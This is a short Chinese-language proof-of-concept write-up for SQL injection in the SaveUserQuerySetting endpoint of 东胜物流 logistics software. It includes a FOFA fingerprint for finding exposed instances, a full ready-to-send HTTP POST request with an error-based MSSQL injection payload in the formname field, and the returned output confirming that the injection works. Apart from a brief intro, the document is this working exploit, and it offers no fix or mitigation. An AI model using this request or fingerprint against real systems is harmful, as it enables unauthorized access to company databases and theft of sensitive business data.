# 东胜物流软件SaveUserQuerySetting存在SQL注入漏洞

# 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 SaveUserQuerySetting接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 东胜物流软件

# 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征

![1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04.png](./img/Z-zu1u1tj1z1oq2D/1708936256348-8d7bf6c6-a3aa-4202-9f9c-a325885eef04-730451.png)

# 四、漏洞复现
```plain
POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
Content-Length: 857
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((+sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D}
```

![1708936597114-d9d3ffd6-39ff-46a5-8c1a-089a70b86853.png](./img/Z-zu1u1tj1z1oq2D/1708936597114-d9d3ffd6-39ff-46a5-8c1a-089a70b86853-946114.png)

```plain
qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq
```

![1708946240065-a4df07ad-6ae3-4004-97f5-d08bac4a7286.png](./img/Z-zu1u1tj1z1oq2D/1708946240065-a4df07ad-6ae3-4004-97f5-d08bac4a7286-976094.png)



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kmeubkhryrzmp90u>